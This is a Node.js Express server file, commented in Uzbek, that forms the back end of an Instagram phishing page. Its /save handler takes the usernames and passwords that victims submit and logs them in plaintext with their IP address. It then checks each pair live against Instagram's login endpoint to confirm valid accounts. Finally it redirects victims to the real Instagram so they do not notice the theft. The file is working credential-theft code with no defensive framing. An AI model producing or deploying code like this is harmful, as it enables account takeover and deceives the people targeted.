const express = require("express");
const fetch = require("node-fetch");
const session = require("express-session"); // session qo'shamiz

const app = express();

app.use(express.urlencoded({ extended: true }));
app.use(express.static(__dirname));

// Session konfiguratsiyasi
app.use(session({
    secret: 'instagram-checker-secret',
    resave: false,
    saveUninitialized: true,
    cookie: { secure: false } // localhost uchun false
}));

// Instagram tekshiruvi
async function instagramTekshir(username, password) {
    try {
        const response = await fetch("https://www.instagram.com/accounts/login/ajax/", {
            method: "POST",
            headers: {
                "content-type": "application/x-www-form-urlencoded",
                "x-requested-with": "XMLHttpRequest",
                "x-ig-app-id": "936619743392459",
                "x-csrftoken": "missing",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            },
            body: new URLSearchParams({
                username: username,
                enc_password: `#PWD_INSTAGRAM_BROWSER:0:${Date.now()}:${password}`,
                queryParams: "{}",
                optIntoOneTap: "false"
            })
        });

        const data = await response.json();
        return data.authenticated === true; // true = to'g'ri parol
    } catch (e) {
        return false;
    }
}

app.post("/save", async (req, res) => {
    const { username, password } = req.body;
    const ip = req.headers["x-forwarded-for"]?.split(",")[0] || req.socket.remoteAddress || "unknown";
    const time = new Date().toLocaleString("uz-UZ", { timeZone: "Asia/Tashkent" });

    console.log(`TEKSHIRUV → ${time} | IP: ${ip} | USER: ${username} | PASS: ${password}`);

    // Sessionda urinishlar sonini hisoblash
    if (!req.session.attempts) {
        req.session.attempts = 1;
    } else {
        req.session.attempts++;
    }

    const togri = await instagramTekshir(username, password);

    if (togri) {
        console.log(`MUVOFAQ → ${username} muvaffaqiyatli kirdi (${req.session.attempts} urinishda)`);
        req.session.destroy(); // Sessionni tozalash
        res.redirect("https://www.instagram.com");
    } else {
        console.log(`XATO → ${username} paroli noto'g'ri (${req.session.attempts} urinish)`);
        
        // Agar 3 marta xato kiritilgan bo'lsa
        if (req.session.attempts >= 3) {
            console.log(`3 MARTA XATO → ${username} uchun Instagram'ga yo'naltirildi`);
            req.session.destroy(); // Sessionni tozalash
            res.redirect("https://www.instagram.com");
        } else {
            // Hali 3 marta emas, qayta urinishga ruxsat
            const qolganUrinishlar = 3 - req.session.attempts;
            res.send(`
                <!DOCTYPE html>
                <html>
                <head>
                    <meta charset="utf-8">
                    <title>Xato</title>
                    <style>
                        body {
                            font-family: sans-serif;
                            background: #fafafa;
                            text-align: center;
                            padding-top: 100px;
                        }
                        .error-box {
                            background: white;
                            border-radius: 10px;
                            padding: 30px;
                            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
                            display: inline-block;
                        }
                        h2 { color: #ed4956; }
                        .attempts {
                            margin: 20px 0;
                            padding: 10px;
                            background: #fff3cd;
                            border-radius: 5px;
                            color: #856404;
                        }
                        .back-btn {
                            background: #0095f6;
                            color: white;
                            border: none;
                            padding: 10px 20px;
                            border-radius: 5px;
                            cursor: pointer;
                            font-size: 16px;
                            margin-top: 20px;
                        }
                        .back-btn:hover {
                            background: #0081d6;
                        }
                    </style>
                </head>
                <body>
                    <div class="error-box">
                        <h2>Login yoki parol noto'g'ri</h2>
                        <div class="attempts">
                            Qolgan urinishlar: ${qolganUrinishlar} ta
                        </div>
                        <p>Iltimos, qayta urinib ko'ring</p>
                        <button class="back-btn" onclick="location.href='/'">Orqaga qaytish</button>
                    </div>
                    <script>
                        setTimeout(() => {
                            document.querySelector('.back-btn').click();
                        }, 3000);
                    </script>
                </body>
                </html>
            `);
        }
    }
});

// Asosiy sahifa
app.get("/", (req, res) => {
    res.sendFile(__dirname + "/index.html");
});

const port = process.env.PORT || 3000;
app.listen(port, "0.0.0.0", () => console.log("Instagram real tekshiruv ishlayapti"));
